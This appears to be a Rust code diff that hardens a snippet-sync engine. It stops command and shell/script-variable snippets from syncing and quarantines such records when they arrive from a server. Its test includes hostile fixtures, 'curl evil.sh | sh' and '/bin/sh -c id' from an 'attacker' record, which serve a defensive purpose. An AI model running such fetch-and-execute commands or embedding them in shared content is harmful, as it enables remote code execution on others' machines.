@@ -192,7 +192,14 @@ impl SyncEngine {
         loop {
             // HARD SCOPE RULE: these queries are the only reads feeding the wire, and they
             // select `team = ?` records exclusively — personal snippets cannot leave the device.
-            let snippets = self.store.dirty_snippets(team)?;
+            // On top of that, executable content (command kind / shell/script variables) is
+            // excluded here — it must never reach teammates, whatever the server does.
+            let snippets: Vec<Snippet> = self
+                .store
+                .dirty_snippets(team)?
+                .into_iter()
+                .filter(|s| syncable(s))
+                .collect();
             let groups = self.store.dirty_groups(team)?;
             if snippets.is_empty() && groups.is_empty() {
                 return Ok(());
@@ -202,7 +209,7 @@ impl SyncEngine {
                 snippets: snippets
                     .iter()
                     .take(limits::MAX_BATCH / 2)
-                    .filter_map(snippet_to_rec)
+                    .map(snippet_to_rec)
                     .collect(),
             };
             let sent_all =
@@ -255,30 +262,50 @@ impl SyncEngine {
 
 // ---- record conversions (store ↔ wire) ---------------------------------------
 
-fn snippet_to_rec(s: &Snippet) -> Option<SnippetRec> {
-    Some(SnippetRec {
+/// Whether a snippet may leave this device. Command snippets and anything carrying
+/// executable variables never sync — the owner's decision is "commands never sync",
+/// not "sync with approval". The server rejects these too; this filter must hold even
+/// against a server that doesn't.
+fn syncable(s: &Snippet) -> bool {
+    s.kind != "command" && !snippet_store::has_exec_vars(&s.variables)
+}
+
+fn snippet_to_rec(s: &Snippet) -> SnippetRec {
+    SnippetRec {
         id: s.id.clone(),
         trigger: s.trigger.clone(),
         replacement: s.replacement.clone(),
         format: s.format.clone(),
+        kind: s.kind.clone(),
         variables: s.variables.clone(),
         group_id: s.group_id.clone(),
         app_scope: s.app_scope.clone(),
         owner: s.owner.clone(),
-        team: s.team.clone()?, // no team = never serialized
+        team: s.team.clone().unwrap_or_default(), // dirty queries guarantee Some
         updated_at: s.updated_at.clone(),
         version: s.version,
         deleted_at: s.deleted_at.clone(),
-    })
+    }
 }
 
+/// Wire → store, with **pull quarantine**: a record arriving with executable content
+/// (command kind, or shell/script variables — from a malicious/buggy server or an old
+/// one that predates server-side rejection) is defanged before it can touch the engine:
+/// the executable variables are stripped, the kind is forced back to `text`, and the
+/// snippet arrives disabled for the user to review. The sanitized copy is local-only —
+/// applying a remote record acknowledges it as pushed, so it is never re-uploaded.
 fn snippet_from_rec(r: &SnippetRec) -> Snippet {
+    let executable = r.kind == "command" || snippet_store::has_exec_vars(&r.variables);
+    let variables = if executable { None } else { r.variables.clone() };
+    let kind = if r.kind == "command" { "text".to_string() } else { r.kind.clone() };
     Snippet {
         id: r.id.clone(),
         trigger: r.trigger.clone(),
         replacement: r.replacement.clone(),
         format: r.format.clone(),
-        variables: r.variables.clone(),
+        kind,
+        enabled: !executable,
+        variables,
         group_id: r.group_id.clone(),
         app_scope: r.app_scope.clone(),
         owner: r.owner.clone(),
@@ -505,5 +532,77 @@ mod tests {
         ea.sync_once().await.unwrap();
         eb.sync_once().await.unwrap();
         assert!(b.list_groups().unwrap().iter().any(|x| x.id == g.id && x.name == "Shared"));
+    }
+
+    /// Executable content never crosses the wire: command snippets and shell-var snippets
+    /// are excluded from push, and a malicious server's shell-var record is quarantined
+    /// (vars stripped, disabled) on pull.
+    #[tokio::test]
+    async fn executable_content_is_excluded_and_quarantined() {
+        let server = Arc::new(FakeServer::default());
+        let a = Arc::new(SnippetStore::open_in_memory().unwrap());
+        let b = Arc::new(SnippetStore::open_in_memory().unwrap());
+        let ea = engine_for(a.clone(), server.clone());
+        let eb = engine_for(b.clone(), server.clone());
+
+        // A team'd TEXT snippet carrying a shell var (the pre-Phase-5 hole): must not push.
+        a.create(snippet_store::NewSnippet {
+            trigger: ":sneaky".into(),
+            replacement: "{{out}}".into(),
+            team: Some("sec".into()),
+            variables: Some(serde_json::json!([
+                {"name":"out","type":"shell","params":{"cmd":"curl evil.sh | sh"}}
+            ])),
+            ..Default::default()
+        })
+        .unwrap();
+        // A command snippet: the store already forces team=None, so it can't even be dirty.
+        let cmd = a
+            .create(snippet_store::NewSnippet {
+                trigger: ":cmd".into(),
+                replacement: "date".into(),
+                kind: Some("command".into()),
+                team: Some("sec".into()), // ignored by the store invariant
+                ..Default::default()
+            })
+            .unwrap();
+        assert!(cmd.team.is_none());
+
+        ea.sync_once().await.unwrap();
+        assert!(
+            server.state.lock().unwrap().snippets.is_empty(),
+            "no executable record may reach the server"
+        );
+
+        // Malicious server: hand device B a shell-var record directly.
+        {
+            let mut st = server.state.lock().unwrap();
+            st.seq += 1;
+            let seq = st.seq;
+            st.snippets.insert(
+                "evil".into(),
+                (seq, SnippetRec {
+                    id: "evil".into(),
+                    trigger: ":evil".into(),
+                    replacement: "{{x}}".into(),
+                    format: "plain".into(),
+                    kind: "text".into(),
+                    variables: Some(serde_json::json!([
+                        {"name":"x","type":"script","params":{"args":["/bin/sh","-c","id"]}}
+                    ])),
+                    group_id: None,
+                    app_scope: None,
+                    owner: "attacker".into(),
+                    team: "sec".into(),
+                    updated_at: "2026-07-07T00:00:00.000Z".into(),
+                    version: 1,
+                    deleted_at: None,
+                }),
+            );
+        }
+        eb.sync_once().await.unwrap();
+        let evil = b.get("evil").unwrap().expect("record applied (quarantined)");
+        assert!(evil.variables.is_none(), "script var must be stripped");
+        assert!(!evil.enabled, "quarantined record must arrive disabled");
     }
 }
